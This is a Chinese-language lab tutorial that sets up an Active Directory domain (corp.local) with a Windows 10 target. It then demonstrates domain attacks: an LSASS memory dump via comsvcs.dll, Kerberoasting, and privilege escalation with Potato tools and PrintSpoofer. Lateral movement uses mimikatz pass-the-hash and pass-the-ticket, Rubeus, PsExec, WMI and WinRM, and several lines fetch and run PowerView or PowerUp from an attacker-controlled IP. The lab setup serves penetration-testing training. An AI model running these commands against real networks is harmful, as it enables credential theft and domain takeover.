一.域控环境配置
========

域控主机：windows server 192.168.40.138

域成员：windows 10 192.168.40.129

1. 准备域控制器（DC）
   =============

**在 Windows Server 上安装 AD DS 角色：**

**powershell**
    # 安装 Active Directory 域服务
    Install-WindowsFeature -Name AD-Domain-Services -IncludeManagementTools

    # 导入模块
    Import-Module ADDSDeployment

    # 创建新域（例如 corp.local）
    Install-ADDSForest `
        -DomainName "corp.local" `
        -DomainNetbiosName "CORP" `
        -ForestMode "WinThreshold" `
        -DomainMode "WinThreshold" `
        -InstallDns:$true `
        -CreateDnsDelegation:$false `
        -DatabasePath "C:\Windows\NTDS" `
        -LogPath "C:\Windows\NTDS" `
        -SysvolPath "C:\Windows\SYSVOL" `
        -NoRebootOnCompletion:$false `
        -Force:$true

这里设置密码的时候需要设置强密码
    $SecurePassword = ConvertTo-SecureString "P@ssw0rd!2024#Lab" -AsPlainText -Force
安装完成后验证
-------

重启后，在域控上执行：

**powershell**
    # 确认域控状态
    Get-ADDomainController

    # 查看域信息
    Get-ADDomain corp.local

    # 查看林信息
    Get-ADForest corp.local

    # 确认 DNS 服务运行
    Get-Service DNS

这样表示域控制器安装成功了

![](https://cdn.nlark.com/yuque/0/2026/png/62398637/1783923500300-7608b83e-e787-4982-9ae9-0a9192fcbf2c.png)

各字段含义

| 字段                     | 值                            | 说明         |
| ---------------------- | ---------------------------- | ---------- |
| `DistinguishedName`    | `DC=corp,DC=local`           | 域的 LDAP 路径 |
| `DNSRoot`              | `corp.local`                 | 域的 DNS 根域名 |
| `NetBIOSName`          | `CORP`                       | 域的短名称      |
| `DomainMode`           | `Windows2016Domain`          | 域功能级别      |
| `Forest`               | `corp.local`                 | 所属林        |
| `InfrastructureMaster` | `WIN-GPN8ACE1K2F.corp.local` | 域控主机名      |

二.将windows靶机加入域成员
=================

### 1. 在 Windows 靶机上设置 DNS

**关键：Windows 靶机的 DNS 必须指向域控 IP**，否则无法解析域。
    # 查看当前网络接口
    Get-NetAdapter

    # 设置 DNS 为域控 IP（假设域控 IP 是 192.168.1.10，接口名为"以太网"）
    Set-DnsClientServerAddress -InterfaceAlias "以太网" -ServerAddresses "192.168.40.138"

### 2. 测试 DNS 解析

    # 测试能否解析域控
    nslookup corp.local
    nslookup WIN-GPN8ACE1K2F.corp.local
    
    # 测试域控 SRV 记录
    nslookup -type=SRV _ldap._tcp.dc._msdcs.corp.local

### 3. 加入域

**powershell**
    # 加入域（需要域管理员凭据）
    Add-Computer -DomainName "corp.local" -Credential "CORP\Administrator" -Restart

这里输入密码之后会重启，这里输入的密码是你windows server 的登录密码

### 4. 验证加入成功

重启后在 Windows 靶机上执行：

**powershell**
    # 确认已在域内
    (Get-WmiObject Win32_ComputerSystem).PartOfDomain  # 应返回 True
    (Get-WmiObject Win32_ComputerSystem).Domain        # 应返回 corp.local

    # 查看当前登录用户信息
    whoami  # 应显示 corp\用户名

    # 查看域内其他计算机
    Get-ADComputer -Filter * | Select Name, DNSHostName

这里输入whoami之后

* 如果登录的是域账户：`corp\用户名`
* 如果还是本地账户：`DESKTOP-7IHJB6T\用户名`

如果 whoami 显示本地用户
----------------

如果 `whoami` 显示的是 `DESKTOP-7IHJB6T\用户名`（本地账户），你可以：

1. **注销当前用户，用域账户登录**
* 用户名：`CORP\Administrator`

* 密码：域管理员密码
2. **或者将当前本地用户添加到域****powershell**
   
   # 查看当前用户
   
    whoami
   
   # 切换到域账户
   
    runas /user:CORP\Administrator cmd（输入windows的登录密码即可）

### 2. 内存凭证（需要提权到 SYSTEM）

如果最终能提权：

**cmd**
    :: 使用 comsvcs.dll（SYSTEM 权限下）
    rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\temp\lsass.dmp full

### 3. Kerberoasting（普通域用户即可）

**powershell**
    # 请求 SPN 的服务票据（不需要 RSAT，不需要管理员）
    Add-Type -AssemblyName System.IdentityModel
    New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/sql01.corp.local:1433"

    # 或者使用 PowerView 的 Invoke-Kerberoast
    IEX (New-Object Net.WebClient).DownloadString('http://你的IP/PowerView.ps1')
    Invoke-Kerberoast -OutputFormat hashcat | Select-Object -ExpandProperty hash

    # 导出票据到本地破解
    klist export kirbi

**Kerberoasting 原理：**

* 任何域用户都可以请求带有 SPN 的服务票据
* 这些票据使用服务账户密码加密
* 离线破解可获得服务账户明文密码

三、权限提升（普通用户 → 管理员/SYSTEM）
-------------------------

### 1. 本地提权漏洞

**powershell**
    # 检查系统补丁
    systeminfo | findstr KB

    # 使用 WinPEAS 自动扫描
    .\winPEASany.exe

    # 使用 PowerUp 检查
    IEX (New-Object Net.WebClient).DownloadString('http://你的IP/PowerUp.ps1')
    Invoke-AllChecks

### 2. 土豆家族提权（NTLM Relay）

**cmd**
    # JuicyPotato（需要 SeImpersonatePrivilege）
    .\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}

    # RoguePotato（JuicyPotato 的升级版）
    .\RoguePotato.exe -r 你的IP -e "cmd.exe"

    # SweetPotato（综合版）
    .\SweetPotato.exe -a t -e cmd.exe

### 3. PrintSpoofer/GenericPotato

**cmd**
    .\PrintSpoofer.exe -c "cmd.exe"

### 4. 计划任务/服务提权

**cmd**
    :: 检查可写路径的服务
    accesschk.exe -uwcqv "Authenticated Users" *
    accesschk.exe -uwcqv "Users" *

    :: 检查 AlwaysInstallElevated
    reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
四、横向移动（获取域凭证后）
--------------

### 1. Pass-the-Hash

**cmd**
    :: 使用 mimikatz
    mimikatz.exe "sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:哈希值 /run:cmd.exe"

    :: 使用 Invoke-WMIExec
    Invoke-WMIExec -Target 192.168.40.138 -Domain corp.local -Username Administrator -Hash 哈希值 -Command "whoami"

### 2. Pass-the-Ticket

**powershell**
    # 导入票据
    mimikatz.exe "kerberos::ptt 票据文件.kirbi"

    # 或者使用 Rubeus
    .\Rubeus.exe ptt /ticket:票据文件.kirbi

### 3. 使用已获取的明文密码

**cmd**
    :: PsExec
    .\PsExec.exe \\192.168.40.138 -u CORP\Administrator -p 密码 cmd.exe

    :: WMI
    wmic /node:192.168.40.138 /user:CORP\Administrator /password:密码 process call create "cmd.exe"

    :: WinRM
    winrs -r:192.168.40.138 -u:CORP\Administrator -p:密码 cmd.exe
